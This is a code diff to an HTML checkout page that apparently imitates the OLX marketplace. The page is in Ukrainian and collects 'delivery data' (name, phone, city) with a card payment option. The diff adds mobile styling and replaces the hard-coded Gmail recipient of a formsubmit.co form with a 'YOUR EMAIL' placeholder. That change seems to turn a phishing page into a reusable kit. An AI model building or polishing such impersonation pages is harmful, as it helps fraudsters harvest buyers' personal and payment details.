@@ -54,7 +54,21 @@
       background:#0f2a2d; color:#fff; padding:20px;
       text-align:center; font-size:13px; margin-top:40px;
     }
-    </style>
+      @media (max-width: 768px) {
+      header { padding:16px 20px; }
+      .container {
+        grid-template-columns: 1fr;
+        padding:20px;
+        margin:20px;
+      }
+      h1 { font-size:22px; }
+      .summary { margin-top:20px; }
+      button { font-size:15px; padding:12px; }
+      input, select, textarea {
+        font-size:16px;
+      }
+    }
+  </style>
   <script>
     let selectedMethod = 'card';
 
@@ -80,7 +94,7 @@
 <body>
 
 <header>
-  <div class="logo">OLX</div>
+  <div class="logo">OLX‑style</div>
   <nav>Чат · Укр · Рус</nav>
 </header>
 
@@ -110,7 +124,7 @@
 
     <h3>Дані для доставки</h3>
 
-    <form action="https://formsubmit.co/proden466@gmail.com" method="POST">
+    <form action="https://formsubmit.co/ВАША_ПОШТА@gmail.com" method="POST">
       <input type="text" name="name" placeholder="Імʼя та прізвище" required />
       <input type="tel" name="phone" placeholder="Телефон" required />
       <input type="text" name="city" placeholder="Місто" required />
@@ -163,4 +177,3 @@
 
 </body>
 </html>
-
